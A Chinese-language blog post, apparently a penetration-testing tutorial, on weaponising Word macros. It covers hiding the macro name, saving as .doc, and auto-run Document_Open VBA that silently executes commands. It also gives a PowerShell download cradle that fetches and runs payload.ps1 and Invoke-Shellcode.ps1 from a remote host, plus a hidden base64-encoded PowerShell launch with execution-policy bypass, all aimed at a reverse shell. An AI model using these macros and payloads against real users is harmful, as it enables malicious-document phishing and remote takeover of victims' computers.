---
title: "Office 宏的利用"
date: 2019-07-30T00:00:00+08:00
draft: false
author: "X1r0z"

tags: ["windows",'office']
categories: ["漏洞复现"]

hiddenFromHomePage: false
hiddenFromSearch: false
twemoji: false
lightgallery: true
ruby: true
fraction: true
fontawesome: true
linkToMarkdown: true
rssFullText: false

toc:
  enable: true
  auto: true
code:
  copy: true
  maxShownLines: 50
math:
  enable: false
share:
  enable: true
comment:
  enable: true
---


在 Office 中宏指对文档样式, 字体, 排版, 格式修改等一系列操作的统称, 通过 VBA 来完成.

<!--more-->

## 文件格式

以 Word 举例, 一般分为三种格式 `.doc`, `.docx`, `.docm`. 其中 `.doc` 可保存带有宏的文档, 而 `.docx` 不能保存, 使用`.docm` 保存带宏文档时会在文件图标上添加提示宏的标志. 但对于任意文档, 都会有宏的安全警告.

在实战中, 一般使用 `.doc` 格式.

## 隐藏宏名

在当前文档中创建新宏.

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20190730151239.png)

在 `Project - Microsoft Word 对象 - ThisDocument` 中编辑宏.

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20190730151342.png)

代码如下.

```
Private Sub Document_Open()
    Dim cmd
    cmd = "cmd.exe /c whoami > C:\windows\Temp\test.txt"
    Call Shell(cmd, vbHide)
End Sub
```

`Document_Open` 指在文档被打开时调用的函数.

删除刚刚创建的宏.

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20190730151722.png)

完成后如下图.

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20190730151830.png)

保存文件, 选择 `.doc` 格式.

## 反弹 Shell

基本的命令执行.

```
Private Sub Document_Open()
    Dim cmd
    cmd = "cmd.exe /c whoami > C:\windows\Temp\test.txt"
    Call Shell(cmd, vbHide)
End Sub
```

powershell 执行.

```
IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.1/payload.ps1')
IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.1/Invoke-Shellcode.ps1')
Invoke-Shellcode -Shellcode $buf
```

base64 编码.

```
Private Sub Document_Open()
    Dim cmd
    cmd = "powershell.exe -nop -w hidden -ep bypass -enc aQBmACgAWwBJAG4AdABQAHQAc......"
    Call Shell(cmd, vbHide)
End Sub
```

其余方式可看 msfvenom 中的 vba, vba-exe 等格式, 在此不再赘述.

注意 `-ep bypass` 设置执行策略.